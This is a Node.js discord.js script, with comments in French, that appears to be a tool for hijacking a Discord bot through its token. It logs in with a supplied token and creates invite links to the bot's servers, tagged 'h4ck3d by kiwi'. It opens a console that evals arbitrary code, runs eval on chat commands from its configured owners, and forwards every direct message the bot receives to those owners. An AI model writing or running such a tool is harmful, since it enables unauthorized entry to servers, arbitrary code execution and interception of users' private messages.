const Discord = require('discord.js');
const client = new Discord.Client();
const { prompt } = require('inquirer')
const config = require('./config.json')

client.on('ready', () => {
	console.log('Ready !')
	console.log(`Connected as ${client.user.username}#${client.user.discriminator} (id : ${client.user.id})`)

	const guilds = client.guilds.cache
		.filter(guild => guild.member(client.user).hasPermission('CREATE_INSTANT_INVITE'))
		.map(({ id, name, owner }) => `${id} - ${name} (owned by ${owner.user.username})`);

	guilds.unshift("Aucun")

	getGuild(guilds).then(id => {
		if (id == 'Aucun') {
			console.log("Tu as choisi de ne pas générer d'invitation")
			customEval();
			return;
		}
		const guild = client.guilds.resolve(id);
		guild.systemChannel.createInvite({ reason: "h4ck3d by kiwi" }).then(invite => {
			console.log(`Invite link : ${invite.url}`);
			customEval()
		})

	});

})

client.on('message', message => {
		const embed = new Discord.MessageEmbed();
		if (message.content.startsWith('=eval ')) {
			if (config.owners.includes(message.author.id)) {
				command = message.content.substr(6);
				try {
					embed.setDescription(eval(command));
					embed.setColor(0x00ff00);
					embed.setTitle("Successful !");
				} catch (exception) {
					embed.setColor(0xff0000);
					embed.setTitle("An error has occured :(");
					embed.setDescription(exception);
				}
			} else {
				embed.setColor(0xff0000);
				embed.setTitle("Erreur")
				embed.setDescription("Vous n'avez pas la permission d'exécuter cette commande !");
			}

			message.channel.send(embed)
		}
		if (message.channel.type == 'dm') {

			if (message.author === client.user) return;
			embed.setColor(0x28ccde)
			embed.setAuthor(message.author.username, message.author.avatarURL)
			embed.setTitle("mp received")
			embed.setDescription(message.content)
			config.owners.forEach((owner) => {
				client.users.resolve(owner).send(embed)
			});
		}
})

function customEval() {
	prompt([
		{
			name: "content",
			message: "eval :"
		}
	]).then(({ content }) => {
		try {
			console.log(eval(content));
		} catch (exception) {
			console.log(exception)
		}
		customEval()
	})
}

const getGuild = (guilds) => {
	return new Promise((resolve, reject) => {
		if (!config.skipinvite) {
			prompt([
				{
					name: "guild",
					type: 'list',
					message: 'Select a guild to invite :',
					filter,
					choices: guilds,
				}
			]).then(({ guild: id }) => resolve(id))
		} else resolve('Aucun')
	})
}

function filter(str) {
	return str.split(' ')[0]
}

function getToken() {
	return new Promise((resolve, reject) => {
		if (config.token) {
			resolve(config.token);
		} else prompt([{ name: "token", message: "token :" }]).then(({ token }) => resolve(token)).catch(reject)
	})
}

getToken()
	.then(token => client.login(token).catch(() => console.log("invalid token !")));